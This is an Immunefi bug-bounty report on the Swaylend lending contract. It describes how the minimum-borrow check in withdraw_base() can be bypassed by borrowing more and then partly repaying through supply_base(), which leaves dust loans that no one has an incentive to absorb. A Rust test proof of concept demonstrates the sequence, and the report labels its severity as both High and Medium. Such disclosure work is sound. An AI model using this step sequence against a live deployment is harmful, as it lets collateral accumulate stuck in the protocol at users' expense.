# #35831 \[SC-High] By bypassing base\_borrow\_min limitation borrows can create inabsorbable loans

**Submitted on Oct 10th 2024 at 08:54:13 UTC by @SeveritySquad for** [**IOP | Swaylend**](https://immunefi.com/audit-competition/iop-swaylend)

* **Report ID:** #35831
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/Swaylend/swaylend-monorepo/blob/develop/contracts/market/src/main.sw>
* **Impacts:**
  * Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)
  * Contract fails to deliver promised returns, but doesn't lose value

## Description

## Brief/Intro

The \`withdraw\_base()\` contains a condition to prevent creation of loans smaller than \`base\_borrow\_min\` amount. This limitation can be bypassed, by creating a larger loan (higher than \`base\_borrow\_min\` amount) and repaying some portion of it so that the remaining part is lower than \`base\_borrow\_min\`.

## Vulnerability Details

The \`withdraw\_base()\` method contains the following condition: \`\`\` require( u256::try\_from(user\_balance.wrapping\_neg()) .unwrap() >= storage .market\_configuration .read() .base\_borrow\_min, Error::BorrowTooSmall, ); \`\`\` While it prevents a borrow for taking a too small loan, this check is not present in the \`supply\_base()\`. As a result a user can take a larger loan and then repay immediately back some smaller portion so that the balance will eventually be lower than \`base\_borrow\_min\`.

## Impact Details

The impact of this issue is that if those position are small enough they may not be worth to cover the gas cost of calling the \`absorb()\` for those accounts. Hence the collateral will be stuck in the contract as there would be no financial incentive to take out such a small amount. While those amounts are small they can amass over time on multiple accounts, hence the chosen severity is Medium as it falls into griefing category.

## References

condition in the \`withdraw\_base()\`: <https://github.com/Swaylend/swaylend-monorepo/blob/bbfa0b0840311d0eb0519d2b4fed8bf9d06868cd/contracts/market/src/main.sw#L625>

## Proof of Concept

## Proof of Concept

The PoC presents creation of a debt position of size \`1\`: \`\`\` #\[tokio::test] async fn poc\_create\_small\_loan() { let TestData { wallets, alice, alice\_account, bob, bob\_account, chad, market, assets, usdc, eth, oracle, price\_feed\_ids, publish\_time, prices, usdc\_contract, .. } = setup().await;

```
let price_data_update &#x3D; PriceDataUpdate {
    update_fee: 0,
    price_feed_ids,
    publish_times: vec![publish_time; assets.len()],
    update_data: oracle.create_update_data(&amp;prices).await.unwrap(),
};

// &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
// &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; Step #0 &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
// 👛 Wallet: Alice 🧛
// 🤙 Call: supply_base
// 💰 Amount: 3000.00 USDC
let alice_supply_amount &#x3D; parse_units(3000 * AMOUNT_COEFFICIENT, usdc.decimals);
let alice_mint_amount &#x3D; parse_units(4000 * AMOUNT_COEFFICIENT, usdc.decimals);
let alice_supply_log_amount &#x3D; format!(&quot;{} USDC&quot;, alice_supply_amount as f64 / SCALE_6);
print_case_title(0, &quot;Alice&quot;, &quot;supply_base&quot;, alice_supply_log_amount.as_str());
println!(&quot;💸 Alice + {alice_supply_log_amount}&quot;);
usdc_contract
    .mint(alice_account, alice_mint_amount)
    .await
    .unwrap();
let balance &#x3D; alice.get_asset_balance(&amp;usdc.asset_id).await.unwrap();
assert!(balance &#x3D;&#x3D; alice_mint_amount);

let alice_supply_res &#x3D; market
    .with_account(&amp;alice)
    .await
    .unwrap()
    .supply_base(usdc.asset_id, alice_supply_amount)
    .await;
assert!(alice_supply_res.is_ok());

market.debug_increment_timestamp().await.unwrap();
// &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
// &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; Step #1 &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
// 👛 Wallet: Bob 🧛
// 🤙 Call: supply_collateral
// 💰 Amount: 1.00 ETH
let bob_supply_amount &#x3D; parse_units(1 * AMOUNT_COEFFICIENT, eth.decimals);
let bob_supply_res &#x3D; market
    .with_account(&amp;bob)
    .await
    .unwrap()
    .supply_collateral(eth.asset_id, bob_supply_amount)
    .await;
assert!(bob_supply_res.is_ok());

let bob_user_collateral &#x3D; market
    .get_user_collateral(bob_account, eth.asset_id)
    .await
    .unwrap()
    .value;
assert!(bob_user_collateral &#x3D;&#x3D; bob_supply_amount);

market
    .print_debug_state(&amp;wallets, &amp;usdc, &amp;eth)
    .await
    .unwrap();

market.debug_increment_timestamp().await.unwrap();

// &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
// &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; Step #2 &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
// 👛 Wallet: Bob 🧛
// 🤙 Call: withdraw_base
// 💰 Amount: &lt;MAX HE CAN BORROW&gt;
let max_borrow_amount &#x3D; market
    .available_to_borrow(&amp;[&amp;oracle.instance], bob_account)
    .await
    .unwrap();
let log_amount &#x3D; format!(&quot;{} USDC&quot;, max_borrow_amount as f64 / SCALE_6);
print_case_title(2, &quot;Bob&quot;, &quot;withdraw_base&quot;, &amp;log_amount.as_str());
let bob_borrow_res &#x3D; market
    .with_account(&amp;bob)
    .await
    .unwrap()
    .withdraw_base(
        &amp;[&amp;oracle.instance],
        max_borrow_amount.try_into().unwrap(),
        &amp;price_data_update,
    )
    .await;
assert!(bob_borrow_res.is_ok());

let balance &#x3D; bob.get_asset_balance(&amp;usdc.asset_id).await.unwrap();
assert!(balance &#x3D;&#x3D; max_borrow_amount as u64);
market
    .print_debug_state(&amp;wallets, &amp;usdc, &amp;eth)
    .await
    .unwrap();

// &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
// &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; Step #3 &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
// 👛 Wallet: Bob 🧛
// 🤙 Call: withdraw_base 
// 💰 Amount: &lt;max he can borrow - 1&gt;

//let tx_policies &#x3D; TxPolicies::default().with_script_gas_limit(1_000_000);

// Withdraw base
    // Supply base
let supply_base_call &#x3D; market
    .with_account(&amp;bob)
    .await
    .unwrap()
    .supply_base(usdc.asset_id, max_borrow_amount as u64 - 1)
    .await;

// Check borrow amount of bob
let (_, borrow) &#x3D; market.get_user_supply_borrow(bob_account).await.unwrap();

println!(&quot;Bob&#x27;s borrow amount: {} &quot;, borrow);
```

} \`\`\`
